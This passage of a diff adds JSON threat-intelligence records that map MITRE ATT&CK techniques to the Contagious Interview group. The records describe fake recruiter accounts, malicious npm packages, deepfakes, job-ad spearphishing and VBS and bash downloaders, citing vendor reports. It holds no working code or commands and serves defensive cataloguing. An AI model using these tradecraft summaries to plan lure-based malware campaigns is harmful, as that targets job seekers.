+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1585",
+        "name": "Establish Accounts",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1585"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has created fake social media accounts such as LinkedIn and Telegram accounts for their targeting efforts.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--e270a284-e4f6-43e1-b116-bb2fc43325b8",
+        "relationship_modified": "2026-07-31T18:47:54.926Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Steve Cobb. (2024, October 29). The Job Offer That Wasn’t: How We Stopped an Espionage Plot. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview FamousChollima October 2024",
+          "url": "https://securityscorecard.com/blog/the-job-offer-that-wasnt-how-we-stopped-an-espionage-plot/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        },
+        {
+          "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+          "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1585.001",
+        "name": "Establish Accounts: Social Media Accounts",
+        "parent_id": "T1585",
+        "url": "https://attack.mitre.org/techniques/T1585/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has created fake email accounts to correspond with social media accounts, fake LinkedIn personas, code repository accounts, and job announcements on development job board services. Contagious Interview has also utilized fake email accounts with Threat Intelligence vendor services.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--e9575965-967c-46fc-bfda-9305c29b045c",
+        "relationship_modified": "2026-07-31T18:47:54.970Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+          "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1585.002",
+        "name": "Establish Accounts: Email Accounts",
+        "parent_id": "T1585",
+        "url": "https://attack.mitre.org/techniques/T1585/002"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview developed malicious NPM packages for delivery to or retrieval by victims.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--697ba5b6-f90a-45f2-a205-d0db15d39961",
+        "relationship_modified": "2026-07-31T18:47:54.625Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "Efstratios Lontzetidis. (2025, January 16). Lazarus APT: Techniques for Hunting Contagious Interview. Retrieved October 20, 2025.",
+          "source_name": "Validin Contagious Interview North Korea ClickFix January 2025",
+          "url": "https://www.validin.com/blog/inoculating_contagious_interview_with_validin/"
+        },
+        {
+          "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+          "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, April 4). Lazarus Expands Malicious npm Campaign: 11 New Packages Add Malware Loaders and Bitbucket Payloads. Retrieved October 20, 2025.",
+          "source_name": "Socket Contagious Interview NPM April 2025",
+          "url": "https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, July 14). Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader. Retrieved October 19, 2025.",
+          "source_name": "Socket BeaverTail XORIndex HexEval Contagious Interview July 2025",
+          "url": "https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1587",
+        "name": "Develop Capabilities",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1587"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has developed malware that utilizes Qt cross-platform framework to include BeaverTail.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--28327f48-fb30-4166-8273-f300879e8e99",
+        "relationship_modified": "2026-07-31T18:47:54.502Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1587.001",
+        "name": "Develop Capabilities: Malware",
+        "parent_id": "T1587",
+        "url": "https://attack.mitre.org/techniques/T1587/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has used remote management and monitoring software such as “AnyDesk”.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--714e1860-5ce1-4d5a-b611-89fbcdb7fbb2",
+        "relationship_modified": "2026-07-31T18:47:54.642Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+          "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        },
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1588.002",
+        "name": "Obtain Capabilities: Tool",
+        "parent_id": "T1588",
+        "url": "https://attack.mitre.org/techniques/T1588/002"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has appeared to have used AI to generate images and content to facilitate their campaigns.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--ac4b42d5-f234-4258-8fa3-d8dc67c16b75",
+        "relationship_modified": "2026-07-31T18:47:54.754Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1588.007",
+        "name": "Obtain Capabilities: Artificial Intelligence",
+        "parent_id": "T1588",
+        "url": "https://attack.mitre.org/techniques/T1588/007"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has hosted malicious payloads on code repositories used as lures for victims to download.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--c5ffbfc0-fd5d-409a-bc0c-e14a75d2c382",
+        "relationship_modified": "2026-07-31T18:47:54.860Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Aleksandar Milenkoski, Sreekar Madabushi, Kenneth Kinion. (2025, September 4). Contagious Interview | North Korean Threat Actors Reveal Plans and Ops by Abusing Cyber Intel Platforms. Retrieved October 20, 2025.",
+          "source_name": "Sentinel One Contagious Interview ClickFix September 2025",
+          "url": "https://www.sentinelone.com/labs/contagious-interview-threat-actors-scout-cyber-intel-platforms-reveal-plans-and-ops/"
+        },
+        {
+          "citation": "Efstratios Lontzetidis. (2025, January 16). Lazarus APT: Techniques for Hunting Contagious Interview. Retrieved October 20, 2025.",
+          "source_name": "Validin Contagious Interview North Korea ClickFix January 2025",
+          "url": "https://www.validin.com/blog/inoculating_contagious_interview_with_validin/"
+        },
+        {
+          "citation": "eSentire Threat Response Unit (TRU). (2024, November 14). Bored BeaverTail & InvisibleFerret Yacht Club – A Lazarus Lure Pt.2. Retrieved October 17, 2025.",
+          "source_name": "Esentire ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.esentire.com/blog/bored-beavertail-invisibleferret-yacht-club-a-lazarus-lure-pt-2"
+        },
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, April 4). Lazarus Expands Malicious npm Campaign: 11 New Packages Add Malware Loaders and Bitbucket Payloads. Retrieved October 20, 2025.",
+          "source_name": "Socket Contagious Interview NPM April 2025",
+          "url": "https://socket.dev/blog/lazarus-expands-malicious-npm-campaign-11-new-packages-add-malware-loaders-and-bitbucket"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, July 14). Contagious Interview Campaign Escalates With 67 Malicious npm Packages and New Malware Loader. Retrieved October 19, 2025.",
+          "source_name": "Socket BeaverTail XORIndex HexEval Contagious Interview July 2025",
+          "url": "https://socket.dev/blog/contagious-interview-campaign-escalates-67-malicious-npm-packages"
+        },
+        {
+          "citation": "Kirill Boychenko. (2025, June 25). Another Wave: North Korean Contagious Interview Campaign Drops 35 New Malicious npm Packages. Retrieved October 19, 2025.",
+          "source_name": "Socket HexEval BeaverTail Contagious Interview June 2025",
+          "url": "https://socket.dev/blog/north-korean-contagious-interview-campaign-drops-35-new-malicious-npm-packages"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Securonix Threat Research, D.Iuzvyk, T. Peck, O.Kolesnikov. (2024, April 24). Analysis of DEV#POPPER: New Attack Campaign Targeting Software Developers Likely Associated With North Korean Threat Actors. Retrieved October 20, 2025.",
+          "source_name": "Securonix Contagious Interview DEVPOPPER April 2024",
+          "url": "https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/"
+        },
+        {
+          "citation": "Seongsu Park. (2024, November 4). From Pyongyang to Your Payroll: The Rise of North Korean Remote Workers in the West. Retrieved October 17, 2025.",
+          "source_name": "Zscaler ContagiousInterview BeaverTail InvisibleFerret November 2024",
+          "url": "https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west"
+        },
+        {
+          "citation": "Unit 42. (2023, November 21). Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto ContagiousInterview BeaverTail InvisibleFerret November 2023",
+          "url": "https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1608.001",
+        "name": "Stage Capabilities: Upload Malware",
+        "parent_id": "T1608",
+        "url": "https://attack.mitre.org/techniques/T1608/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has created fake social media accounts such as LinkedIn and Telegram accounts for their targeting efforts.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--4901a1a4-5db0-48a5-b046-23c8bc054f3a",
+        "relationship_modified": "2026-07-31T18:47:54.556Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1683.001",
+        "name": "Generate Content: Written Content",
+        "parent_id": "T1683",
+        "url": "https://attack.mitre.org/techniques/T1683/001"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has used AI to clone video-conferencing applications to distribute their BeaverTail malware. They have also used AI to create deepfake videos.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--fc6b549d-3f8a-447f-bc6f-a8133334dc15",
+        "relationship_modified": "2026-07-31T18:47:54.988Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Unit42. (2024, October 9). Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware. Retrieved October 17, 2025.",
+          "source_name": "PaloAlto Unit42 ContagiousInterview BeaverTail InvisibileFerret October 2024",
+          "url": "https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1683.002",
+        "name": "Generate Content: Audio-Visual Content",
+        "parent_id": "T1683",
+        "url": "https://attack.mitre.org/techniques/T1683/002"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has used fake job advertisements and messages sent via social media to spearphish targets. Contagious Interview has also leveraged hiring websites to solicit victims.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--43411790-39ce-4c88-aff0-1c53631fd130",
+        "relationship_modified": "2026-07-31T18:47:54.538Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        },
+        {
+          "citation": "Efstratios Lontzetidis. (2025, January 16). Lazarus APT: Techniques for Hunting Contagious Interview. Retrieved October 20, 2025.",
+          "source_name": "Validin Contagious Interview North Korea ClickFix January 2025",
+          "url": "https://www.validin.com/blog/inoculating_contagious_interview_with_validin/"
+        },
+        {
+          "citation": "Insikt Group. (2025, February 13). Inside the Scam: North Korea’s IT Worker Threat. Retrieved October 17, 2025.",
+          "source_name": "Recorded Future Contagious Inteview BeaverTail InvisibleFerret OtterCookie February 2025",
+          "url": "https://www.recordedfuture.com/research/inside-the-scam-north-koreas-it-worker-threat"
+        },
+        {
+          "citation": "Matej Havranek. (2025, February 20). DeceptiveDevelopment targets freelance developers. Retrieved October 17, 2025.",
+          "source_name": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025",
+          "url": "https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+        },
+        {
+          "citation": "Ryan Sherstobitoff. (2024, October 29). Inside a North Korean Phishing Operation Targeting DevOps Employees. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview October 2024",
+          "url": "https://securityscorecard.com/blog/inside-a-north-korean-phishing-operation-targeting-devops-employees/"
+        },
+        {
+          "citation": "Steve Cobb. (2024, October 29). The Job Offer That Wasn’t: How We Stopped an Espionage Plot. Retrieved October 20, 2025.",
+          "source_name": "SecurityScorecard Contagious Interview FamousChollima October 2024",
+          "url": "https://securityscorecard.com/blog/the-job-offer-that-wasnt-how-we-stopped-an-espionage-plot/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566.003",
+        "name": "Phishing: Spearphishing via Service",
+        "parent_id": "T1566",
+        "url": "https://attack.mitre.org/techniques/T1566/003"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has utilized VBS scripts to open cmd.exe and run commands to include the go_batch.bat batch file.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--54a62885-d76d-44b2-be94-9b677bf472d9",
+        "relationship_modified": "2026-07-31T18:47:54.584Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/003"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has targeted macOS victim hosts using a bash downloader coremedia.sh and a bash script cloud.sh.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--2390e766-7624-45bf-81c7-2ecd5437b9bf",
+        "relationship_modified": "2026-07-31T18:47:54.488Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/004"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has utilized Visual Basic scripts in the execution of their downloader malware targeting Windows devices including as script called update.vbs.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--d3b7d0eb-68f4-40c1-ba44-9ebd6c21de55",
+        "relationship_modified": "2026-07-31T18:47:54.881Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Amaury G., Coline Chavane, Felix Aimé and Sekoia TDR. (2025, March 31). From Contagious to ClickFake Interview: Lazarus leveraging the ClickFix tactic. Retrieved April 1, 2025.",
+          "source_name": "Sekoia ClickFake 2025",
+          "url": "https://blog.sekoia.io/clickfake-interview-campaign-by-lazarus/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.005",
+        "name": "Command and Scripting Interpreter: Visual Basic",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/005"
+      }
+    },
+    {
+      "attack_ref": "G1052",
+      "confidence": "high",
+      "description": "Contagious Interview has used the Python-based malware such as InvisibleFerret to install and execute Python Packages and Python modules.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--95e47f6d-6da2-4269-b6a5-b2253de83a8c",
+        "relationship_modified": "2026-07-31T18:47:54.721Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
